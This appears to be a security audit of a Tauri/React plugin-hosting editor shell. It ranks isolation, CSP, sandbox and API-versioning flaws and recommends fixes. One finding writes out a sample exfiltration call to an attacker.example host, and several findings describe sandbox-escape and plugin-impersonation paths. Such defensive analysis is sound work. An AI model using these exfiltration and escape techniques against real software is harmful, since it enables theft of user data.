# Nexus — Editor-Shell Architecture Audit (UI)

**Audit date:** 2026-04-16
**Auditor:** Editor-Shell Auditor (v1), per `editor-shell-auditor.md`
**Scope:** `app/src/**` (React/Vite frontend), plus the shell-side Tauri surface in `crates/nexus-app/src/` that directly shapes the UI contract.
**Companion audit:** `docs/MICROKERNEL-AUDIT.md` (microkernel / kernel-bus / loader; 2026-04-16). This report inherits some findings from that audit where the UI is the user-visible manifestation — those are cross-referenced, not re-discovered.

---

## 1. System Under Audit

### Shell inspiration & calibration

Nexus is a **VS Code + Obsidian hybrid desktop shell**: a Tauri-2 native shell hosting a React/Vite WebView, with plugins contributing panels, ribbon items, status items, commands, keybindings, menus, editor decorations, snippets, and tree views. Per README and the prior microkernel audit, the shell is designed to run **third-party, untrusted community plugins** — i.e. the same trust model as VS Code / Obsidian extensions, where any user can install a plugin from any author.

That calibration materially raises the bar for the UI surface in three ways:

1. Plugin code must not be able to exfiltrate data, tamper with the shell DOM of other plugins, or escalate filesystem/OS access beyond declared capabilities.
2. Ambient stability guarantees (no-freeze, no-crash, no ID hijacking) must survive a hostile or buggy plugin.
3. Every extension point must have a disposable, a namespaced ID, and a declarative manifest counterpart so collisions and leaks are observable.

### UI architecture map

```
┌───────────────────────────────────────────────────────────────────────┐
│                       Tauri 2 native shell                            │
│  crates/nexus-app/src/{lib.rs, plugins.rs, commands.rs, …}            │
│  - PluginManager, TauriIpcDispatcher, CompositeIpcDispatcher           │
│  - kernel-bus ↔ Tauri event forwarders (forge:fs-changed, theme:*)   │
│  - invoke_handler: 50+ commands (forge, editor, plugins, keybindings) │
│  - capabilities/default.json, tauri.conf.json (security)              │
└──────────────────────────┬────────────────────────────────────────────┘
                           │ Tauri invoke / emit
┌──────────────────────────▼────────────────────────────────────────────┐
│                    React/Vite WebView (app/src)                       │
│                                                                       │
│  main.tsx → registerBuiltins → registerPluginContributions →         │
│             hydrateOverrides → startPluginEventLogger                 │
│                                                                       │
│  App.tsx   ─ ToastOverlay, KeybindingDispatcher,                      │
│              CommandPalette, SettingsModal, WorkspaceView             │
│                                                                       │
│  WorkspaceView                                                        │
│   ├── MenuBar (menuItems contrib)                                     │
│   ├── Ribbon (ribbonItems contrib)                                    │
│   ├── Side panels (contentType → useContentType)                      │
│   ├── Center split pane (EditorSurface / PluginPanel / …)             │
│   └── StatusBar (statusItems contrib)                                 │
│                                                                       │
│  contributions/registry.ts (≈1215 LOC) — central extension-point      │
│    registry: commands, views, contentTypes, paletteCommands,          │
│    settingsTabs, editorBlockTypes, decorations, keybindings,          │
│    treeDataProviders, snippets, fileHandlers, uriHandlers,            │
│    webviewPanels, menuItems, contextMenuItems                         │
│                                                                       │
│  plugins/scriptRuntime.ts  — Blob-URL dynamic import() of JS plugins  │
│  plugins/nexusContext.ts   — host API surface given to script plugins │
│  ipc/plugins.ts            — typed wrappers over Tauri invoke         │
│  keybindings/              — parser + global dispatcher               │
│  stores/{layout, theme, forge, palette, toast}.ts — Zustand state     │
└───────────────────────────────────────────────────────────────────────┘
```

### Plugin tiers in scope

| Tier           | Loader                                       | Host surface                        | UI audit implications |
|----------------|----------------------------------------------|-------------------------------------|------------------------|
| WASM (wasmtime) | `nexus-plugins::loader`                     | IPC dispatch via Rust               | Sandbox boundary in Rust; UI only sees typed results |
| Native Rust    | Static-linked core plugins                   | IPC dispatch via Rust               | Out of scope for UI audit |
| **JS script**  | `app/src/plugins/scriptRuntime.ts`          | **Full WebView DOM + Tauri invoke** | **In-scope and critical — same origin as the shell** |

---

## 2. Executive Summary

The UI is a competently-built extension host with an unusually disciplined **contribution registry** (`contributions/registry.ts`): every extension point exposes matched `registerX` / `subscribeX` / `getX` / `clearByPlugin` methods, every registration returns a Disposable, and React views bind through `useSyncExternalStore` so hot-reload stays coherent. The command / keybinding / menu bus is namespaced, the theme engine speaks in CSS variables, and plugin lifecycle is reliably cleaned on reload.

Where the design breaks down is at the **isolation boundary for JS script plugins**. Script plugins are loaded via `URL.createObjectURL(new Blob([...], { type: "application/javascript" }))` and `import(url)` directly into the main WebView thread (`app/src/plugins/scriptRuntime.ts:61-67`). Combined with `tauri.conf.json` setting `"csp": null` (`crates/nexus-app/tauri.conf.json`), an untrusted script plugin has full DOM access to every other plugin's rendered surface, full access to the Tauri `invoke()` bridge, the ability to self-assert its `pluginId` into the host API (`app/src/plugins/nexusContext.ts:184`), and no wall-clock budget on the main thread. For the stated "third-party untrusted" trust model this is a critical architectural gap, not a rough edge.

Secondary issues cluster around **extension-API stability** (no versioned contract package, no `api_version` check at load time — inherited F-9.2.1 in the microkernel audit), **observability of plugin behaviour** (no "show running extensions" panel, no activation timing, no per-plugin crash quarantine in the frontend), and **silent extension-point collisions** (keybinding conflicts resolve first-wins with only a `console.warn`, no when-clause system).

The contribution registry itself is the best thing in the repo — most of the remediation work is about tightening the boundary *around* it, not replacing it.

### Severity tallies

| Severity      | Count |
|---------------|-------|
| 🔴 Critical   | 3     |
| 🟠 High       | 8     |
| 🟡 Medium     | 9     |
| 🟢 Low        | 4     |
| ✅ Strength   | 10    |

---

## 3. Findings by Dimension

### Dimension 1 — Shell scope & built-ins

**F-1.1.1 🟡 Core editor is a built-in, not a plugin-contributed content type** — `app/src/components/surfaces/EditorSurface.tsx` imports `@codemirror/state` and the full CM6 toolchain directly into shell code; the editor surface is wired into the shell through `app/src/components/layout/WorkspaceView.tsx` rather than through `contributions.registerContentType`. For an "editor-shell" the editor is typically the first thing to be expressed as an extension point so alternative editors can replace it (cf. VS Code's text editor provider). Today, a plugin cannot ship a markdown editor that replaces the built-in one; it can only ship a second content type for a different extension.
  *Why it matters:* locks the repo into a single editor engine, and makes the dogfood test for the extension API ("can the editor be rewritten as a plugin?") always fail.
  *Recommended action:* define a `ContentType` with id `"com.nexus.editor.markdown"`, register it in `builtins.ts`, move `EditorSurface` behind the registration, and mark it built-in at trust level `core`. Keep the CM6 compartments API exposed via `ctx.editor`.

**F-1.2.1 🟢 Minimal default command surface** — `app/src/contributions/builtins.ts` registers exactly four commands (`workspace.help`, `workspace.settings`, `workspace.command-palette`, `workspace.switch-forge`) and three menu-bar structures. The shell has resisted the temptation to hard-code dozens of workspace commands, leaving room for plugins to own the command surface. Keep this posture.

**✅ Strength — Explicit built-ins entry point** — `main.tsx` calls `registerBuiltins()` before `registerPluginContributions()`, so built-ins always win the "first-registration" race and plugins cannot accidentally steal foundational command IDs during boot.

---

### Dimension 2 — Extension API contract

**F-2.1.1 🟠 No versioned `@nexus/extension-api` package** — The host API surface a JS plugin sees is `NexusPluginContext` in `app/src/plugins/nexusContext.ts` plus `contributions/index.ts`. Plugins cannot `import` a stable type package; they rely on the runtime shape of the `ctx` object and on ambient types duplicated in their own source. This is the UI twin of backend finding F-2.1.1 in `MICROKERNEL-AUDIT.md` (no `nexus-plugin-contract` crate). Today, any change to `NexusPluginContext` silently breaks every script plugin the next time it is loaded — nothing at build time or load time catches it.
  *Why it matters:* you can't have a third-party ecosystem without a versioned contract. Plugin authors have no way to say "I work with API v2 but not v3", and the shell has no way to reject an incompatible plugin before executing its `onInit`.
  *Recommended action:* extract `NexusPluginContext`, the contribution DTOs (`EditorBlockType`, `TreeDataProvider`, `MenuItem`, `UriHandler`, `WebviewPanelConfig`, `Snippet`, …) and the minimum necessary Zod-like runtime validators into `packages/nexus-extension-api/`. Publish semver. Make `@nexus/extension-api@^1` the only supported import path for script plugins. Pair with F-9.1.1.

**F-2.2.1 🟠 Host API shape drifts between capability declaration and runtime** — `plugins/hello-nexus/manifest.toml` declares `capabilities.required = ["events.publish"]` and `optional = ["ui.notify"]`, but the JS-side `createNexusContext` (`app/src/plugins/nexusContext.ts:184-226`) hands out `settings`, `events`, `ipc`, `editor`, and all of `ui` unconditionally regardless of what the manifest asked for. A JS plugin that did not declare `ui.registerContextMenuItem` can still register context menu items. Capabilities are enforced on the Rust-side command bridge (`invoke_plugin_ipc`), but purely-client-side registrations escape the policy.
  *Why it matters:* capability declarations become cosmetic for script plugins. A user who inspects the manifest before installing is misled about what the plugin can actually do inside the WebView.
  *Recommended action:* have the shell read each plugin's declared capabilities at load time and construct a `NexusPluginContext` that only exposes the requested surface, stubbing the rest with a throw-on-call that logs the capability error. Tie to F-5.1.1 in the microkernel audit.

**F-2.3.1 🟡 `Disposable` is a bare function, not a typed object** — `app/src/plugins/nexusContext.ts:26` declares `type Disposable = () => void`. VS Code's equivalent is `{ dispose(): void }` which (a) is trivially identifiable in a collection, (b) composes with `vscode.Disposable.from(...)`, and (c) can be made idempotent. Today, a plugin must hand-roll `const disposables: (()=>void)[] = []` and remember to call each — there is no helper, no auto-idempotency, no "dispose everything this plugin registered" bulk-call exposed to the plugin itself.
  *Why it matters:* plugin authors leak registrations on partial failure in `onInit`. The host does have `clearByPlugin` internally (`registry.ts`), but plugins can't use it.
  *Recommended action:* ship a `ctx.disposables` `DisposableStore` in `nexusContext.ts` that plugins can push into; auto-flush it when the plugin is unloaded. Keep the bare function alias for backward compat.

**✅ Strength — Symmetric register/subscribe/get across every extension point** — `contributions/registry.ts` maintains the same triplet (and a `clearByPlugin`) for commands, views, content types, palette commands, settings tabs, editor block types, editor decoration providers, editor keybindings, tree data providers, snippets, file handlers, URI handlers, webview panels, menu items, and context menu items. React consumers bind through `useSyncExternalStore` and get coherent hot-reload for free. This is the cleanest thing in the codebase.

---

### Dimension 3 — Manifest & activation

**F-3.1.1 🟢 Contributions are declarative in TOML** — `plugins/hello-nexus/manifest.toml` registers panels, commands, settings tabs, ribbon items, status items, URI handlers, and event subscribers before the plugin is instantiated. The shell reads these via `list_plugin_contributions` and renders the chrome without needing the plugin's code to run. This is the correct posture.

**F-3.2.1 🟠 No activation events for script plugins** — The manifest's `[lifecycle] on_init = true` flag forces eager activation on shell start. There is no equivalent of VS Code's `onCommand:foo`, `onView:bar`, `onLanguage:baz` that would let a script plugin stay dormant until the user actually touches its surface. With the script runtime loading every plugin's module on boot, a 20-plugin forge will run 20 `onInit` functions serially on the UI thread before the user sees the chrome (`app/src/contributions/plugins.ts` → `syncAll`).
  *Why it matters:* cold-start cost scales linearly with plugin count and is borne entirely on the main thread. This is the single most common cause of extension-host jank in editors that copy this pattern.
  *Recommended action:* extend the manifest with `[activation] on_command = [...]`, `on_content_type = [...]`, `on_uri_scheme = [...]`. Only read a script plugin's module when the first matching activation event fires. Pair with F-8.2.1.

**F-3.3.1 🟡 Manifest does not declare which JS plugin types are "script" vs "WASM"** — The runtime distinction lives on the registered entry (`entry.runtime === "script"` in `contributions/plugins.ts`), but the manifest.toml for `hello-nexus` does not declare it explicitly — it's inferred from the presence/absence of `[wasm]` vs `[script]` sections. Making this explicit (`[plugin] runtime = "script"`) would let validation tools, marketplace metadata, and the "Show Running Extensions" panel (F-10.1.1) show it without loading the plugin.
  *Recommended action:* add a required `runtime` field in `[plugin]`, reject the manifest if `runtime` disagrees with which section is present.

**F-3.4.1 🟢 Capability list is declarative** — `[capabilities] required = […]` / `optional = […]` in the manifest exists and is visible before code runs. The only gap is enforcement on the JS side (F-2.2.1), not the declarative surface itself.

---

### Dimension 4 — Command / keybinding / menu bus

**F-4.1.1 🟠 Keybinding collisions silently resolve first-wins with only a console warning** — `app/src/keybindings/KeybindingDispatcher.tsx:21-25` documents the policy: *"Precedence on a conflict is 'first registration wins' — ... a plugin trying to take the same chord silently loses."* In a multi-plugin install this is user-hostile — a plugin the user just installed may visibly do nothing on its advertised keybinding, with no UI affordance to discover why. VS Code's model is `keybindings.json` with explicit overrides and a "Show conflicting keybindings" command.
  *Why it matters:* the observable failure mode is "plugin is broken", not "plugin conflicts with X" — and there is no way for the user to rebind the losing plugin to a free chord through the UI.
  *Recommended action:* (a) surface a conflict event on the registry when two plugins claim the same chord; (b) add a keybinding-conflict panel in Settings that shows all conflicts and lets the user resolve them; (c) persist resolutions via the existing `keybindings.set_keybinding_override` command, which already exists but is user-opaque today.

**F-4.1.2 🟡 `EditorKeybinding.when` field is declared but never evaluated** — `contributions/registry.ts:116` exposes a `when?: string` field on `EditorKeybinding`. Nothing in the codebase parses or evaluates it — `grep -n "when" app/src/contributions/**` shows it is only ever read as a label. VS Code's when-clause language (`editorTextFocus && !inQuickOpen && foo`) is how 90% of conflicts are avoided in practice: two plugins can bind the same chord if one is `when: editorTextFocus` and the other is `when: terminalFocus`.
  *Recommended action:* either implement a small when-clause evaluator (there are open-source ones under 500 LOC) or strip the field until you're ready to. Leaving it in the API shape is worse than either option because plugin authors will set it and expect it to work.

**F-4.2.1 🟢 Commands dispatched through the registry, not through string `eval`** — `contributions.invokeCommand(id, args)` looks up the registered handler and calls it directly; the command palette uses `queueMicrotask` to defer dispatch until after its own unmount (`app/src/components/palette/CommandPalette.tsx`). Clean, testable, no string-to-function coercion anywhere.

**F-4.3.1 🟡 Menu items can target any top-level menu, including built-ins, without conflict resolution** — `contributions.registerMenuItem({ menu: "File", … })` merges plugin items into the top-level File menu. There is no ordering guarantee between plugins (`order?: number` is documented but collisions are not resolved) and no namespace separator between plugin items and built-in items. A malicious plugin can sort itself above "Save".
  *Recommended action:* enforce that plugin items are grouped below a separator and sorted by `order` then `pluginId`; reserve `order < 0` for built-ins only.

**✅ Strength — Command namespace is enforced by type** — Contribution DTOs demand the `plugin:<id>:<name>` form; the registry logs a warning and replaces on collision. Combined with the `clearByPlugin` dispose path, hot-reload is collision-safe.

---

### Dimension 5 — UI surface extension points

**F-5.1.1 🔴 Webview iframe sandbox allows `same-origin`** — `app/src/contributions/registry.ts:1195` constructs webview panels with:

```ts
iframe.sandbox = "allow-scripts allow-same-origin" + (config.allowPopups ? " allow-popups" : "");
```

The inline comment at lines 185-192 claims this is safe *"due to cross-origin iframe boundary"*, but an iframe whose `src` is an `https://localhost:NNN/panel.html` served from the same origin as the shell (which is the documented example in `nexusContext.ts:176`) will *not* be cross-origin, and `allow-same-origin` then grants the plugin full `document.cookie` / `window.top` access over the shell's origin. For the untrusted trust model this is a sandbox escape.
  *Why it matters:* a community webview panel can read and mutate the shell's own DOM and storage if it is served from any URL that resolves to the shell's origin (including `blob:` URLs constructed by the same plugin). The documentation asserts safety that the code does not deliver.
  *Recommended action:* drop `allow-same-origin`; if panels need persistent storage, expose a host-mediated storage API through `ctx`. Require that all webview panels load over a synthetic `tauri-plugin://<id>/...` scheme that is documented as a distinct origin from the shell, and validate the scheme at registration time.

**F-5.1.2 🔴 Tauri CSP is disabled** — `crates/nexus-app/tauri.conf.json`: `"security": { "csp": null }`. This removes the last backstop against injected-script exfiltration. A script plugin running in the main WebView can `fetch("https://attacker.example/…", { body: JSON.stringify({ forge: … }) })` without restriction.
  *Why it matters:* CSP is the standard browser defense against untrusted code running in your origin. Disabling it globally makes every UI-surface finding in this audit worse.
  *Recommended action:* enable a strict CSP (at minimum `default-src 'self' tauri:; script-src 'self'; connect-src 'self' tauri: https:` with explicit `frame-src tauri:`). Vite HMR needs `'unsafe-eval'` in dev only; gate that behind `process.env.NODE_ENV`. Audit every use of `style=` in plugin-contributed DOM to make sure a strict CSP doesn't break them (it will — see F-5.2.1).

**F-5.2.1 🟠 Plugin panel contents are string-only and trimmed of any structure** — `app/src/components/panels/PluginPanel.tsx` renders plugin-supplied panel results as `<pre>{result.content}</pre>`. This is *safe* (can't inject markup), but it means plugin panels cannot contribute real interactive UI. The webview-panel escape hatch (F-5.1.1) is the only way plugins can render richer content, and it comes with a sandbox cost. This is a real bind: the safe path is useless, the useful path is unsafe.
  *Why it matters:* the healthy middle — "plugin contributes a React-ish declarative tree, shell renders it with known-safe primitives" — doesn't exist. Plugins who want a form will reach for the webview escape hatch.
  *Recommended action:* add a `registerPanelView(viewId, renderFn)` where `renderFn` returns a JSON tree of approved primitives (`{ type: "vstack", children: [...] }`, `{ type: "button", label, command }`). Shell renders via a fixed dispatcher. This is what Raycast and Sketch extensions do.

**F-5.3.1 🟢 Theme engine uses CSS variables + kernel-bus event propagation** — `crates/nexus-app/src/lib.rs:225` forwards `com.nexus.theme.*` bus events to the `theme:changed` Tauri event, and `app/src/stores/theme.ts` reacts. Plugins do not touch the DOM directly to restyle chrome. This is the right separation.

**✅ Strength — Status, ribbon, settings tabs, and context-menu extension points all share one contribution registry** — The visual chrome surfaces are uniform in API shape, which means a single `clearByPlugin` call cleans them all up on reload.

---

### Dimension 6 — Workspace / document / editor abstractions

**F-6.1.1 🟡 No TextDocument / Workspace abstraction exposed to plugins** — Script plugins can register editor block types, decorations, keybindings, and snippets (`ctx.editor.*`), but they cannot read or mutate editor content — there is no `ctx.workspace.openDocument(uri)` / `ctx.workspace.onDidChangeTextDocument(…)` / `ctx.editor.active.selection`. The shell owns a `KernelRuntime` with `editor_open`/`editor_apply_transaction`/`editor_sync_content` commands (`crates/nexus-app/src/lib.rs:156-164`), but they are not bridged into the JS plugin context.
  *Why it matters:* a plugin cannot implement "format on save", "comment current selection", or anything involving the current document without reaching out of `ctx` and calling `invoke("editor_apply_transaction", …)` directly — which bypasses all capability gating.
  *Recommended action:* add `ctx.workspace` and `ctx.editor.active` surfaces that wrap the existing Tauri commands and go through capability checks. Make them the only supported path; deprecate `invoke` access from plugin code.

**F-6.2.1 🟢 FileHandler extension point exists and is used** — `builtins.ts` registers `md`/`mdx` to the built-in editor; plugins can register their own via `ctx.ui.registerFileHandler(ext, contentTypeId)`. This is the right shape for "let a plugin own `.canvas`".

**F-6.3.1 🟡 Forge (workspace root) is a singleton with no concept of multi-root** — `forge::ForgeState` is `Mutex<Option<ForgeInfo>>` (`crates/nexus-app/src/lib.rs:58`). The API shape assumes one workspace. VS Code, Obsidian, and IntelliJ all support multi-root workspaces, which plugins need to think about (a tree provider scoped to root A shouldn't see files in root B). This is a design-time decision to flag, not a bug — but worth surfacing before plugin APIs calcify around single-root.

---

### Dimension 7 — Plugin lifecycle

**F-7.1.1 🟢 Every `registerX` returns a `Disposable`, and plugin reload drops all of them** — `app/src/contributions/plugins.ts` → `syncAll` maintains a disposable list per plugin, calls each on reload, and re-registers from the refreshed manifest list. The contribution registry additionally holds a `clearByPlugin(pluginId)` backstop. This is the rare case where a JS plugin runtime actually keeps up with hot-reload without leaks.

**F-7.2.1 🟠 No per-plugin crash quarantine in the frontend** — If a script plugin's `onInit` throws, the exception propagates up `dispatchToScript` / `registerPluginContributions` and can abort the registration loop for *all* plugins loaded after it. There is no `try { plugin.onInit() } catch { markPluginFailed(id); continue }` boundary that (a) logs the failure against the plugin, (b) marks it "failed" in a UI surface, (c) offers the user a disable/uninstall action.
  *Why it matters:* one buggy plugin can cause apparent breakage in an unrelated one, and the user has no path to diagnose or recover without editing the forge by hand.
  *Recommended action:* wrap every plugin lifecycle call (`onInit`, `onStart`, `onStop`, `dispatch`) in a per-plugin error boundary that reports through a `plugins:status` store surfaced in the Settings → Plugins tab (F-10.1.1).

**F-7.3.1 🟡 `onStop` is not called when the window closes** — `app/src/contributions/plugins.ts` calls disposables on reload, but the `onStop` hook of a script plugin is not invoked during window close — Tauri tears down the WebView and plugin code gets no chance to flush state. For most plugins this is fine; for plugins holding an open file handle or a debounced save timer, it's a silent data-loss risk.
  *Recommended action:* wire `window.addEventListener("beforeunload", …)` in the shell to call `onStop` for every loaded script plugin with a 100ms budget. Match the existing 100 ms tick used by the storage event forwarder.

**F-7.4.1 🟢 Hot-reload ordering — disposables first, then re-register** — `plugins.ts` `syncAll` drops old disposables before requesting the new manifest, so there is no window where a stale panel and a fresh panel coexist with the same ID.

---

### Dimension 8 — Execution isolation

**F-8.1.1 🔴 JS script plugins run in the main WebView thread with full DOM + Tauri access** — `app/src/plugins/scriptRuntime.ts:61-67`:

```ts
const blob = new Blob([source], { type: "application/javascript" });
const url = URL.createObjectURL(blob);
const mod = (await import(/* @vite-ignore */ url)) as ScriptPlugin;
```

The loaded module runs on the shell's main thread, in the shell's origin, with `window`, `document`, `fetch`, `localStorage`, `indexedDB`, and the Tauri `invoke` global all reachable. Combined with F-5.1.2 (no CSP) and F-2.2.1 (capabilities unenforced in JS), a malicious plugin has complete run of the host. For "third-party untrusted" this is the critical finding of the audit.
  *Why it matters:* the stated trust model is incompatible with in-main-thread execution. Obsidian accepts this tradeoff by being explicit that plugins are fully trusted; VS Code avoids it by running extensions in a separate Node host process with a controlled RPC surface; Figma plugins avoid it by running in `iframe` sandboxes over `postMessage`. Nexus today claims VS-Code-like isolation but delivers Obsidian-level trust.
  *Recommended action:* move JS plugin execution into a dedicated `<iframe sandbox="allow-scripts">` (no `allow-same-origin`) whose only communication with the shell is `postMessage` over a typed protocol. Expose the existing `NexusPluginContext` as a message-passing proxy. This is disruptive — expect 1–2 engineer-months — but the trust model requires it.

**F-8.1.2 🔴 Plugin `pluginId` is self-asserted in the host context** — `app/src/plugins/nexusContext.ts:184`: `createNexusContext(pluginId)` takes the id as a parameter and every call from that plugin uses it verbatim — including `ctx.events.emit`, `ctx.ipc.call` (as the caller), `ctx.ui.notify` (`source: pluginId`), and the per-plugin settings get. The plugin's own code is free to call `createNexusContext("com.nexus.theme")` or, more realistically, modify its captured `pluginId` closure variable before using `ctx`.
  *Why it matters:* any plugin can impersonate any other plugin in every host-side audit trail and in every capability check that trusts the JS-side `pluginId` (the IPC bridge does re-check on the Rust side — see `invoke_plugin_ipc` — but the toast `source`, the settings namespace, the event emit `pluginId`, and the per-plugin disposables all trust the JS string).
  *Recommended action:* construct the context inside a closure that the plugin cannot access, and freeze `ctx.pluginId` via `Object.freeze`. Better: don't pass `pluginId` to plugin code at all — derive it at the iframe/worker boundary and reject any host call whose asserted identity disagrees with the boundary identity.

**F-8.2.1 🟠 No UI-thread time budget on plugin commands** — `contributions.invokeCommand(id)` calls the handler synchronously from the UI thread. A plugin command that computes for 5 seconds freezes the palette, the ribbon, and the menu bar. There is no `requestIdleCallback`, no AbortSignal-based cancellation, no "this plugin is taking too long" UI.
  *Recommended action:* wrap plugin-originated command dispatches in an await-with-timeout (250 ms warning, 2 s cancel). Surface slow-plugin telemetry in F-10.1.1.

**F-8.3.1 🟠 No memory budget on script plugins** — WASM plugins have `memory_mb = 8` in their manifest (`hello-nexus/manifest.toml`). Script plugins have no equivalent — they allocate against the WebView heap directly. A plugin that accumulates a 500 MB structure in a Zustand-ish store will OOM the whole shell.
  *Recommended action:* at minimum, track `performance.measureUserAgentSpecificMemory()` per plugin-iframe when F-8.1.1 lands; warn on budget overrun.

**✅ Strength — WASM plugins are properly isolated on the Rust side** — This audit treats the WASM path as out-of-scope because the backend audit already confirmed wasmtime limits, fuel, and per-handler timeouts are enforced. The UI talks to WASM plugins only through typed IPC results, never by executing their code.

---

### Dimension 9 — Versioning & compatibility

**F-9.1.1 🔴 `api_version` is declared in every manifest but never validated** — `plugins/hello-nexus/manifest.toml:6`: `api_version = "1"`. Grepping the codebase shows this field is read into the manifest struct but never compared against the shell's supported range at load time. This is the UI-visible twin of F-9.2.1 in `MICROKERNEL-AUDIT.md`.
  *Why it matters:* a plugin built against a future incompatible API will be loaded and run, and fail at whatever point it first touches a missing method — typically deep in a user interaction. The manifest already carries the metadata needed to refuse the plugin cleanly; the check just isn't written.
  *Recommended action:* define `SUPPORTED_API_VERSIONS = ["1"]` in the shell; in `contributions/plugins.ts` `syncAll`, filter plugins whose `api_version` isn't in the set, log a single warning with a "update plugin / update Nexus" message, and surface them as "incompatible" in the plugins panel.

**F-9.2.1 🟠 No semver on the extension API** — Because there is no extracted `@nexus/extension-api` package (F-2.1.1), there is no place to put a version. Plugin authors cannot say `"dependencies": { "@nexus/extension-api": "^1.4.0" }`, and the shell cannot say "I implement `@nexus/extension-api@1.7.2`". Every API change is today equally breaking.
  *Recommended action:* tied to F-2.1.1 and F-9.1.1. Publish semver, document the breakage policy, add a CI check that fails on API surface change without a version bump.

**F-9.3.1 🟠 No deprecation channel** — When `EditorKeybinding.when` (F-4.1.2) is finally implemented, the correct process is: announce intent in release N, mark old behaviour deprecated with a console warning in N+1, remove in N+2. There is no mechanism for this today; the repo has no `DEPRECATED.md`, no `@deprecated` JSDoc on any contribution DTO, and no per-plugin deprecation log surfaced anywhere.
  *Recommended action:* adopt the VS Code pattern of `@deprecated` JSDoc tags on contribution types plus a per-plugin deprecation report generated at load time. Cheap once F-2.1.1 lands.

---

### Dimension 10 — Observability & debuggability

**F-10.1.1 🟡 No "Show Running Extensions" surface** — There is no UI in the shell that enumerates loaded plugins, their activation state, their capabilities, their recent errors, or their contribution counts. The Settings modal has tabs contributed by plugins but no tab contributed *about* plugins. The only way to know what's installed is to read the forge's `plugins/` dir by hand.
  *Why it matters:* the first question during any plugin bug report is "what's installed and what has it registered?" — and today there's no screenshot you can ask for.
  *Recommended action:* ship a Settings → Plugins tab listing each plugin with: id, name, version, runtime tier, trust level, status (loaded / failed / deactivated), capabilities (declared and used), contributions (count per extension point), last-error, slowest command. Wire to F-7.2.1 error boundaries and F-8.2.1 timing.

**F-10.2.1 🟢 Console logs are prefixed by plugin** — `[contributions] `, `[plugins] `, and the per-plugin dispatch path in `scriptRuntime.ts` consistently prefix logs. `app/src/plugins/events.ts` `startPluginEventLogger` attributes kernel events to plugin IDs. A developer tailing the DevTools console can distinguish plugins.

**F-10.3.1 🟡 No per-plugin activation timing** — `startPluginEventLogger` logs events as they arrive, but there is no `performance.mark("plugin:<id>:onInit-start")` / `measure` surrounding lifecycle calls. The cold-start scaling problem from F-3.2.1 is invisible without this.
  *Recommended action:* instrument `scriptRuntime.ts` around `module.onInit` and `module.onStart` with `performance.measure`; expose results in F-10.1.1.

**F-10.4.1 🟢 Hello-Nexus scaffold is comprehensive** — `plugins/hello-nexus/manifest.toml` exercises commands, panels, settings tabs, ribbon items, status items, event subscribers, and the IPC round-trip to confirm frontend→backend→bus→frontend. A plugin author copying this scaffold sees every extension point wired at least once. Keep curating it as the canonical template.

**F-10.5.1 🟢 Tauri event naming is stable and namespaced** — `forge:fs-changed`, `theme:changed`, `nexus:url-opened`, `plugin:event`, `plugins:reloaded` are documented at the call site and consumed in `App.tsx` / specialized stores. A plugin author listening in DevTools sees sensible names.

---

## 4. Strengths

1. **The contribution registry is genuinely well-built.** `contributions/registry.ts` is the best single file in the UI — consistent triplet API, `useSyncExternalStore` bindings, per-plugin disposables, collision logs. It is the correct foundation; everything this audit flags is work *around* it.
2. **Hot-reload works.** Drop-disposables-then-re-register is the right sequence, and it is executed consistently for every extension point.
3. **Theme-as-CSS-variables** with bus-driven propagation keeps plugins out of the chrome's DOM.
4. **Command palette dispatch is microtasked** (`queueMicrotask` after modal unmount), avoiding the re-entrancy class of bug.
5. **Namespaced plugin IDs** are enforced at the contribution boundary.
6. **Minimal built-ins** — only four workspace commands, nothing foreclosed by the shell on day one.
7. **`hello-nexus` scaffold** exercises every extension point and is useful as a living spec.
8. **Tauri invoke bridge has a single-entry design** — `invoke_plugin_ipc` with an explicit `caller_plugin_id` is the right shape for backend capability checks, even where the JS side doesn't yet enforce them.
9. **Forge persistence is debounced** (500ms) — layout changes don't hammer disk.
10. **Kernel-bus → Tauri-event forwarding threads are clearly scoped and named** — `nexus-storage-event-forwarder`, `nexus-theme-event-forwarder` with documented poll intervals.

---

## 5. Prioritized Action List

### Tier 0 — Cannot ship to untrusted users without these

| ID | Action | Effort |
|----|--------|--------|
| F-8.1.1 | Move JS script plugin execution into a sandboxed iframe (or dedicated Web Worker where DOM is not required) with a postMessage protocol. | L (1–2 eng-months) |
| F-5.1.2 | Enable a strict Tauri CSP (`default-src 'self' tauri:; script-src 'self'; connect-src 'self' tauri: https:`). Test every built-in and plugin panel for breakage. | M (1–2 weeks) |
| F-5.1.1 | Drop `allow-same-origin` from webview-panel iframes; serve panels from a distinct synthetic origin. | M (1 week) |
| F-9.1.1 | Validate `api_version` at load time; reject incompatible plugins with a user-visible error. | S (days) |
| F-8.1.2 | Bind `pluginId` at the sandbox boundary; remove self-assertion from the host context. (Depends on F-8.1.1.) | S (days after F-8.1.1) |

### Tier 1 — Substantive design gaps, schedule into next quarter

| ID | Action | Effort |
|----|--------|--------|
| F-2.1.1 / F-9.2.1 | Extract `@nexus/extension-api` package with semver. Publish. | M |
| F-2.2.1 | Enforce `capabilities.required` / `optional` in the JS-side `createNexusContext`. | S |
| F-4.1.1 | Keybinding-conflict UI in Settings, plus a `plugins:keybindings-conflict` event surface. | M |
| F-5.2.1 | Declarative plugin-panel primitives (`registerPanelView` with an approved component vocabulary). | M |
| F-7.2.1 | Per-plugin error boundary around every lifecycle call; `plugins:status` store. | S |
| F-8.2.1 | UI-thread time budget on plugin dispatches with warn/cancel thresholds. | S |
| F-8.3.1 | Memory accounting per script plugin. (Depends on F-8.1.1.) | M |
| F-10.1.1 | "Show Running Extensions" tab in Settings. | M |

### Tier 2 — Quality & ergonomics

| ID | Action | Effort |
|----|--------|--------|
| F-1.1.1 | Dogfood the editor as a content-type contribution. | L |
| F-3.2.1 | Activation events for script plugins. | M |
| F-3.3.1 | Explicit `runtime` field in manifest `[plugin]`. | S |
| F-4.1.2 | Implement `when`-clause evaluator or strip the field. | S |
| F-4.3.1 | Menu-item ordering groups (built-in vs plugin separators). | S |
| F-6.1.1 | Expose `ctx.workspace` / `ctx.editor.active` APIs. | M |
| F-6.3.1 | Decide multi-root workspace posture before API calcifies. | (decision) |
| F-7.3.1 | `onStop` on window close. | S |
| F-9.3.1 | Deprecation policy + `@deprecated` tags. | S |
| F-10.3.1 | `performance.measure` around plugin lifecycle. | S |

### Tier 3 — Polish

| ID | Action |
|----|--------|
| F-2.3.1 | Ship a `DisposableStore` on `ctx`. |

---

## 6. Suspected Issues Requiring Investigation

These are things the code base shape suggests are problems, but I did not have time to construct a proof-of-concept for. A 1–2 day spike on each would either confirm a new finding or clear the suspicion.

